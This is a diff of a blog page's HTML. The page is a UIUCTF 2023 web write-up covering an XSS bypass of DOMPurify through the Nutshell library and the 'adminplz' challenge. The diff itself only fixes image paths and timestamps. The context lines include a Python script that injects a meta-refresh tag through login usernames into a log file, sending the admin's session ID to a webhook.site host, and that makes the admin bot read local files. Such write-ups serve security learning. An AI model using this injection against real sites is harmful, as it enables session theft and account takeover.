@@ -26,11 +26,11 @@
 <meta property="og:description" content="peanut-xssAn interesting XSS problem. Analyzing the website’s code, we can find our input html code has been checked by the DOMPurify, and then, it will be rendered by nutshell  So let’s check the sou">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/UIUCTF2023-WEB-WP/1.png">
-<meta property="og:image" content="http://example.com/Users/acheing/blog/source/_posts/UIUCTF2023-WEB-WP/2.png">
-<meta property="og:image" content="http://example.com/Users/acheing/blog/source/_posts/UIUCTF2023-WEB-WP/3.png">
-<meta property="og:image" content="http://example.com/Users/acheing/blog/source/_posts/UIUCTF2023-WEB-WP/4.png">
+<meta property="og:image" content="http://example.com/UIUCTF2023-WEB-WP/2.png">
+<meta property="og:image" content="http://example.com/UIUCTF2023-WEB-WP/3.png">
+<meta property="og:image" content="http://example.com/UIUCTF2023-WEB-WP/4.png">
 <meta property="article:published_time" content="2023-07-06T12:45:01.000Z">
-<meta property="article:modified_time" content="2023-07-06T12:47:15.449Z">
+<meta property="article:modified_time" content="2023-07-06T12:50:20.454Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="WP">
 <meta name="twitter:card" content="summary">
@@ -230,8 +230,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-07-06 20:47:15</span>
-            <span class="mobile">2023-07-06 20:47</span>
+            <span class="desktop">2023-07-06 20:50:20</span>
+            <span class="mobile">2023-07-06 20:50</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -271,7 +271,7 @@
 <p><img lazyload src="/images/loading.svg" data-src="/./UIUCTF2023-WEB-WP/1.png" alt="image-20230706145114541"></p>
 <p>So let’s check the source code of <a class="link" target="_blank" rel="noopener" href="https://github.com/ncase/nutshell">Nutshell <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>In the line 615 &amp; 622, we can notice a vulnerability.</p>
-<p><img lazyload src="/images/loading.svg" data-src="/Users/acheing/blog/source/_posts/UIUCTF2023-WEB-WP/2.png" alt="image-20230706155356772"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/./UIUCTF2023-WEB-WP/2.png" alt="image-20230706155356772"></p>
 <p>We can notice that if we input a HTML entity(e.g. <code>&amp;lt</code>), it will be rendered as <code>&lt;</code> in ex.InnerText.</p>
 <p>After then, the symbol <code>&lt;</code> will be directly passed to the linkText, which will be appended into the ex later</p>
 <p>So, there exists a XSS, and then we can get the cookie.</p>
@@ -279,9 +279,9 @@
 
 <h2 id="adminplz"><a href="#adminplz" class="headerlink" title="adminplz"></a>adminplz</h2><p>What a nice problem.</p>
 <p>Check the source code, we can notice that there exists a log file.</p>
-<p><img lazyload src="/images/loading.svg" data-src="/Users/acheing/blog/source/_posts/UIUCTF2023-WEB-WP/3.png" alt="image-20230706164040286"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/./UIUCTF2023-WEB-WP/3.png" alt="image-20230706164040286"></p>
 <p>Besides, we can inject out username and sessionid into the log.</p>
-<p><img lazyload src="/images/loading.svg" data-src="/Users/acheing/blog/source/_posts/UIUCTF2023-WEB-WP/4.png" alt="Screenshot 2023-07-06 at 16.43.24"></p>
+<p><img lazyload src="/images/loading.svg" data-src="/./UIUCTF2023-WEB-WP/4.png" alt="Screenshot 2023-07-06 at 16.43.24"></p>
 <p>So, there is a basic idea that we can concat two malicious username(e.g. <code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; URL=&#39;VPS/?leak=</code> and <code>&#39;&quot;&gt;</code>) as a malicious script to get admin’s sessionid</p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">baseurl = <span class="string">&quot;https://inst-83397f672f438108.adminplz.chal.uiuc.tf/&quot;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(baseurl + <span class="string">&quot;login&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0; URL=&#x27;https://webhook.site/2830354e-68f8-4e15-9b28-c9dc0685ce14/?leak=&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">res = requests.get(baseurl + <span class="string">&quot;admin?view=flag&quot;</span>, cookies=res.cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">res = requests.post(baseurl + <span class="string">&quot;report&quot;</span>, data=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080/admin?view=file:///flag.html&quot;</span>&#125;, cookies=res.cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Coffee Break!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">305</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">res = requests.post(baseurl + <span class="string">&quot;login&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;&#x27;\&quot;&gt;&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">res = requests.get(baseurl + <span class="string">&quot;admin?view=flag&quot;</span>, cookies=res.cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">res = requests.post(baseurl + <span class="string">&quot;report&quot;</span>, data=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080/admin?view=file:///var/log/adminplz/latest.log&quot;</span>&#125;, cookies=res.cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># res = requests.get(baseurl + &quot;admin?view=file:///flag.html&quot;, cookies=&#123;&quot;JSESSIONID&quot;: &quot;CBB67381DD7D3DD626E64DC0200BB3E1&quot;&#125;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># print(res.text)</span></span><br></pre></td></tr></table></figure></div>
 
@@ -298,7 +298,7 @@
         <li><strong>Created at:</strong> 2023-07-06 20:45:01</li>
         
             <li>
-                <strong>Updated at:</strong> 2023-07-06 20:47:15
+                <strong>Updated at:</strong> 2023-07-06 20:50:20
             </li>
         
         <li>
